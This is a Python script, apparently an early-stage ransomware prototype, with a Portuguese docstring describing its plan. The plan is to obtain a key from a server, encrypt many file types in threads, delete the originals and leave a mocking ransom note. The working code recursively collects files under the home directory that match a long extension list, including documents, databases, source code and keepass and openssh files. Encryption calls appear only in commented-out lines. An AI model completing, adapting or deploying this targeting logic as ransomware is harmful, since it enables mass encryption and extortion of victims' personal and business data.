#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

#from AES.crypt import *
import os


'''
    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU

'''


def menu():
    home=os.environ['HOME']
    print('Partindo de: '+str(home))
    # lista com todos os arquivos #
    retorno=listar(home)
    #print(str(retorno).replace("',",'\n').replace("'",'').replace('[','').replace(']',''))


def listar(diretorio):
    # cria uma lista onde será adicionado o nome dos arquivos #
    arquivos=[]
    for caminho, diretorio, arquivo in os.walk(diretorio):
        for arq in arquivo:
            a=caminho+'/'+arq
            extensao=os.path.splitext(a)
            if(extensao[1]=='.pdf' or
                extensao[1]=='.txt' or
                extensao[1]=='.jpeg' or
                extensao[1]=='.jpg' or
                extensao[1]=='.png' or
                extensao[1]=='.jpeg' or
                extensao[1]=='.mp3' or
                extensao[1]=='.mp4' or
                extensao[1]=='.wav' or
                extensao[1]=='.sql' or
                extensao[1]=='.zip' or
                extensao[1]=='.7z' or
                extensao[1]=='.tar' or
                extensao[1]=='.gzip' or
                extensao[1]=='.jar' or
                extensao[1]=='.iso' or
                extensao[1]=='.db' or
                extensao[1]=='.frm' or
                extensao[1]=='.mdf' or
                extensao[1]=='.odb' or
                extensao[1]=='.xlsx' or
                extensao[1]=='.doc' or
                extensao[1]=='.sqlite' or
                extensao[1]=='.ai' or
                extensao[1]=='.psd' or
                extensao[1]=='.indd' or
                extensao[1]=='.cdr' or
                extensao[1]=='.cpt' or
                extensao[1]=='.fm' or
                extensao[1]=='.docm' or
                extensao[1]=='.docx' or
                extensao[1]=='.EPUB' or
                extensao[1]=='.epub' or
                extensao[1]=='.log' or
                extensao[1]=='.html' or
                extensao[1]=='.js' or
                extensao[1]=='.c' or
                extensao[1]=='.py' or
                extensao[1]=='.rb' or
                extensao[1]=='.java' or
                extensao[1]=='.info' or
                extensao[1]=='.md' or
                extensao[1]=='.asb' or
                extensao[1]=='.3dmf' or
                extensao[1]=='.c4d' or
                extensao[1]=='.odf' or
                extensao[1]=='.com' or
                extensao[1]=='.odp' or
                extensao[1]=='.as' or
                extensao[1]=='.m' or
                extensao[1]=='.php' or
                extensao[1]=='.pyc' or
                extensao[1]=='.pyw' or
                extensao[1]=='.r' or
                extensao[1]=='.sh' or
                extensao[1]=='.vbs' or
                extensao[1]=='.openssh' or
                extensao[1]=='.keepass' or
                extensao[1]=='.raw' or
                extensao[1]=='.ada' or
                extensao[1]=='.cob' or
                extensao[1]=='.d' or
                extensao[1]=='.b' or
                extensao[1]=='.go' or
                extensao[1]=='.3gp' or
                extensao[1]=='.gif' or
                extensao[1]=='.mpeg' or
                extensao[1]=='.u' or
                extensao[1]=='.bin' or
                extensao[1]=='.xml' or
                extensao[1]=='.pl' or
                extensao[1]=='.json'):
                arquivos.append(a)
    return arquivos




if __name__=="__main__":
    print('começando')
    menu()



'''with open('', 'rb') as in_file, open('', 'wb') as out_file:
    encrypt(in_file, out_file, 'password')
with open('FB_IMG_1495038132603.jpg.crypto', 'rb') as in_file, open('FB_IMG_1495038132603.jpg', 'wb') as out_file:
    decrypt(in_file, out_file, "password")
'''
